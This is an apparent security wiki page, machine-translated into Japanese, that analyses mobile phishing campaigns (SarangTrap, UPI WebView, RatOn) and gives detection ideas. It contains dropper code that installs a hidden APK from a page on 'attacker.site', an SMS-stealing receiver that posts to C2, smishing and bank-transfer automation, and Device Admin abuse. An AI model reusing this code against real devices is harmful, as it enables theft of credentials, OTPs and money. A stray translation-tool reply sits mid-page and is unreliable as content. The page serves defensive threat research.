# モバイルフィッシングと悪質アプリ配布 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページはフィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリ等）を通じて、**悪質な Android APK** と **iOS の mobile-configuration プロファイル** を配布するために脅威アクターが使う技術を扱います。資料は Zimperium zLabs が公開した SarangTrap キャンペーン（2025）やその他の公開リサーチを基にしています。

## 攻撃フロー

1. **SEO/フィッシング インフラ**
* 類似ドメインを数十件登録（出会い系、クラウド共有、車のサービス…）。
– `<title>` 要素に現地語のキーワードや絵文字を入れて Google での順位を狙う。
– 同一ランディングページに Android (`.apk`) と iOS のインストール手順を両方ホストする。
2. **第一段階ダウンロード**
* Android: *unsigned* または「サードパーティストア」APK への直接リンク。
* iOS: `itms-services://` または通常の HTTPS リンクで悪質な **mobileconfig** プロファイルへ誘導（下参照）。
3. **インストール後のソーシャルエンジニアリング**
* 初回起動時にアプリが **招待コード / 検証コード** を要求（限定アクセスの印象を与える）。
* コードは Command-and-Control (C2) に **HTTP で POST** される。
* C2 が `{"success":true}` を返す ➜ マルウェアは動作を続行。
* 有効なコードを送信しないサンドボックス／AV の動的解析は **悪意ある挙動を検出できない**（回避）。
4. **実行時パーミッション濫用** (Android)
* 危険なパーミッションは **C2 が肯定応答した後にのみ要求** される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近のバリアントは `AndroidManifest.xml` から SMS 用の `<uses-permission>` を削除するが、Java/Kotlin のコードパスではリフレクション経由で SMS を読む処理が残っている ⇒ 静的スコアを下げつつ、AppOps の悪用や古いターゲットでの権限付与時には機能する。
5. **見せかけの UI とバックグラウンド収集**
* アプリはローカル実装された無害なビュー（SMS ビューア、ギャラリーピッカー）を表示する。
* その間に以下を吸い上げる:
- IMEI / IMSI、電話番号
- フルな `ContactsContract` ダンプ（JSON 配列）
- `/sdcard/DCIM` からの JPEG/PNG を [Luban](https://github.com/Curzibn/Luban) で圧縮してサイズを削減
- 任意で SMS 内容（`content://sms`）
ペイロードは **バッチで zip** 化され `HTTP POST /upload.php` 経由で送信される。
6. **iOS 配布手法**
* 1 つの **mobile-configuration プロファイル** で `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` などを要求し、MDM ライクな監督下にデバイスを登録できる。
* ソーシャルエンジニアリング手順:
1. 設定を開く ➜ *Profile downloaded*。
2. ランディングページのスクリーンショット通りに *Install* を 3 回タップ。
3. 署名されていないプロファイルを信頼する ➜ 攻撃者は App Store レビューを経ずに *Contacts* と *Photo* の権限を得る。
7. **ネットワーク層**
* 平文 HTTP、しばしばポート 80 で HOST ヘッダは `api.<phishingdomain>.com` のようになる。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS を使わないため発見が容易）。

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – マルウェア評価時に Frida/Objection で招待コードフェーズを自動化し、悪性分岐に到達する。
* **Manifest vs. Runtime Diff** – `aapt dump permissions` と実行時の `PackageManager#getRequestedPermissions()` を比較；危険なパーミッションが欠けているのはレッドフラッグ。
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` を設定して、コード入力後の不自然な POST バーストを検出する。
* **mobileconfig Inspection** – macOS で `security cms -D -i profile.mobileconfig` を使い `PayloadContent` を列挙して過剰な権限を見つける。

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** によりキーワード豊富なドメインの急増を捕捉。
* **User-Agent & Path Regex**: Google Play 外の Dalvik クライアントからの `(?i)POST\s+/(check|upload)\.php` を検出。
* **Invite-code Telemetry** – APK インストール直後に 6–8 桁の数字コードを POST する通信はステージングの兆候。
* **MobileConfig Signing** – MDM ポリシーで署名されていない構成プロファイルをブロック。

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## インジケーター（汎用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 パターン

このパターンは、政府給付をテーマにしたキャンペーンで観測され、インドの UPI 資格情報や OTP を盗むために悪用されている。オペレーターは配布と耐障害性のために信用あるプラットフォームを連鎖させる。

### 信頼されたプラットフォームにまたがる配布チェーン
- YouTube video lure → 説明欄に短縮リンクが含まれる
- 短縮リンク → GitHub Pages の phishing site（正規ポータルを模倣）
- 同じ GitHub repo が、ファイルに直接リンクする偽の「Google Play」バッジ付きの APK をホストしている
- 動的な phishing ページは Replit 上でホストされ、リモートコマンドチャネルは Firebase Cloud Messaging (FCM) を使用する

### Dropper と組み込み payload、およびオフラインインストール
- 最初の APK は installer (dropper) で、実際の malware を `assets/app.apk` として同梱し、クラウド検出を鈍らせるためにユーザーに Wi‑Fi/モバイルデータを無効化するよう促す。
- 組み込み payload は無害に見えるラベル（例：“Secure Update”）でインストールされる。インストール後、installer と payload は別個のアプリとして存在する。

静的トリアージのヒント (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlinkによる動的エンドポイント検出
- Malwareはshortlinkからプレーンテキストのカンマ区切りライブエンドポイント一覧を取得し、単純な文字列変換で最終的なphishingページのパスを生成する。

例（サニタイズ済み）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
疑似コード:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebViewベースのUPI認証情報収集
- 「Make payment of ₹1 / UPI‑Lite」ステップは、WebView内で動的エンドポイントから攻撃者のHTMLフォームを読み込み、機密フィールド（電話番号、銀行、UPI PIN）をキャプチャし、それらを`POST`で`addup.php`に送信します。

最小ローダー:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自己伝播とSMS/OTPの傍受
- 初回実行時に過剰な権限が要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先をループ処理して、被害者のデバイスからsmishing SMSを大量送信する。
- 受信したSMSは broadcast receiver によって傍受され、メタデータ（sender, body, SIM slot, per-device random ID）とともに `/addsm.php` にアップロードされる。

受信機のスケッチ:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) を回復力のある C2 として
- ペイロードは FCM に登録されます。プッシュメッセージはアクションをトリガーするスイッチとして使用される `_type` フィールドを含みます（例: phishing テキストテンプレートを更新、挙動を切り替え）。

FCM のペイロード例:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
ハンドラの概略:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### ハンティングパターンとIOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### 検知と防御のアイデア
- インストール中にネットワークを無効にするようユーザーに指示し、その後 `assets/` から2次APKをサイドロードするアプリを検出対象にする。
- 権限の組み合わせ `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` と WebViewベースの決済フローに対してアラートを出す。
- 非企業ホストでの `POST /addup.php|/addsm.php` に対するアウトバウンド通信を監視し、既知のインフラをブロックする。
- Mobile EDRルール：FCMに登録し、`_type` フィールドで分岐する信頼されていないアプリを検出。

---

## Android Accessibility/Overlay & Device Admin Abuse、ATS automation、およびNFC relay orchestration – RatOnケーススタディ

The RatOn banker/RAT campaign (ThreatFabric)は、モダンなモバイルフィッシングがどのようにWebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover、さらにはNFC-relay orchestrationを組み合わせるかの具体例である。このセクションでは再利用可能なテクニックを抽象化する。

### Stage-1: WebView → native install bridge (dropper)
攻撃者は攻撃者ページを指すWebViewを表示し、ネイティブインストーラを公開するJavaScriptインターフェースを注入する。HTMLボタンのタップがネイティブコードを呼び出し、dropperのassetsにバンドルされた第2ステージのAPKをインストールして直接起動する。

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
HTMLが提示されていません。翻訳したいHTMLまたは該当するページ内容（Markdownを含む）を貼り付けてください。

注意事項：
- code、ハッキング手法名、一般的なハッキング用語、クラウド/SaaS名（Workspace、aws、gcpなど）、"leak"、pentesting、リンクやパス、Markdown/HTMLタグは翻訳しません。
- タグやリンクの構文（例: {#tabs}、{#ref}、ファイルパスなど）はそのまま保持します。
```html
<button onclick="bridge.installApk()">Install</button>
```
インストール後、dropper は explicit package/activity を介して payload を起動します:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### 同意取得フロー：Accessibility + Device Admin + その後のランタイムプロンプト
Stage-2 は “Access” ページをホストする WebView を開く。ページのボタンはエクスポートされたメソッドを呼び出し、被害者を Accessibility 設定へ遷移させて不正サービスの有効化を要求する。有効化されると、マルウェアは Accessibility を使って以降のランタイム許可ダイアログ（contacts、overlay、manage system settings など）を自動クリックし、Device Admin を要求する。

- Accessibility はプログラム的にノードツリー内の「Allow」/「OK」などのボタンを検出し、クリックイベントを送信して後続のプロンプトを承認するのに用いられる。
- Overlay 権限の確認/要求：
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
参照：

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView を利用したオーバーレイ phishing/ransom
オペレーターは以下のコマンドを実行できる：
- URL からフルスクリーンのオーバーレイを表示する、または
- inline HTML を渡し、それを WebView オーバーレイにロードする。

想定される用途：強制（PIN入力）、wallet を開いて PIN を取得、ransom メッセージ送信。オーバーレイ権限が不足している場合に備え、権限が付与されているか確認するコマンドを用意しておくこと。

### リモートコントロールモデル – テキスト疑似スクリーン + screen-cast
- 低帯域：定期的に Accessibility node tree をダンプし、visible texts/roles/bounds をシリアライズして擬似スクリーンとして C2 に送信する（`txt_screen` は一回、`screen_live` は継続的、のようなコマンド）。
- 高忠実度：MediaProjection を要求し、オンデマンドで screen-casting/recording を開始する（`display` / `record` のようなコマンド）。

### ATS playbook（bank app automation）
JSON task を受け取り、銀行アプリを開き、Accessibility 経由で UI を操作する。テキストクエリと座標タップを組み合わせ、プロンプトが出たら被害者の payment PIN を入力する。

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "新しい支払い"
- "Zadat platbu" → "支払いを入力"
- "Nový příjemce" → "新しい受取人"
- "Domácí číslo účtu" → "国内口座番号"
- "Další" → "次へ"
- "Odeslat" → "送信"
- "Ano, pokračovat" → "はい、続行する"
- "Zaplatit" → "支払う"
- "Hotovo" → "完了"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.
オペレーターは、`check_limit` や `limit` のようなコマンドを使って、同様に限度額のUIを操作し、送金限度を確認・引き上げることもできます。

### Crypto wallet seed extraction
対象は MetaMask、Trust Wallet、Blockchain.com、Phantom のようなアプリ。フロー: unlock（盗んだ PIN または提供された password）、Security/Recovery に移動して seed phrase を表示、keylog/exfiltrate it。ナビゲーションを言語間で安定させるために、locale-aware selectors (EN/RU/CZ/SK) を実装する。

### Device Admin coercion
Device Admin APIs は、PIN 捕獲の機会を増やし、被害者を困らせるために使用されます:

- 即時ロック:
```java
dpm.lockNow();
```
- 現在の認証情報を期限切れにして変更を強制する（Accessibility が新しい PIN/パスワードを取得する）:
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard の生体認証機能を無効化して、非生体認証でのロック解除を強制する：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意: 多くの DevicePolicyManager 制御は最近の Android で Device Owner/Profile Owner を必要とします; 一部の OEM ビルドは緩い場合があります。常にターゲットの OS/OEM 上で検証してください。

### NFC リレーのオーケストレーション (NFSkate)
Stage-3 は外部の NFC-relay モジュール（例: NFSkate）をインストールして起動し、リレー中に被害者を誘導するための HTML テンプレートを渡すことさえできます。これにより、オンライン ATS と並行した非接触カード提示によるキャッシュアウトが可能になります。

背景: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/状態: `txt_screen`, `screen_live`, `display`, `record`
- ソーシャル: `send_push`, `Facebook`, `WhatsApp`
- オーバーレイ: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- ウォレット: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- デバイス: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- 通信/偵察: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### 検出と防御のアイデア (RatOn スタイル)
- インストーラー/権限メソッドを公開する `addJavascriptInterface()` を使った WebView を探索する; Accessibility プロンプトを引き起こす “/access” で終わるページに注目する。
- サービスアクセス付与直後に高頻度の Accessibility ジェスチャ/クリックを生成するアプリにアラートを出す; Accessibility ノードダンプに似たテレメトリを C2 に送信する挙動を監視する。
- 信頼されていないアプリでの Device Admin ポリシー変更を監視する: `lockNow`、パスワードの有効期限設定、keyguard 機能の切り替え。
- 非企業アプリからの MediaProjection プロンプトと、それに続く定期的なフレームアップロードを検知したらアラートを上げる。
- 別のアプリによってトリガーされる外部 NFC-relay アプリのインストール/起動を検出する。
- 銀行向け: out-of-band 確認、生体認証バインディング、オンデバイスの自動化に耐性のある取引制限を施行する。

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
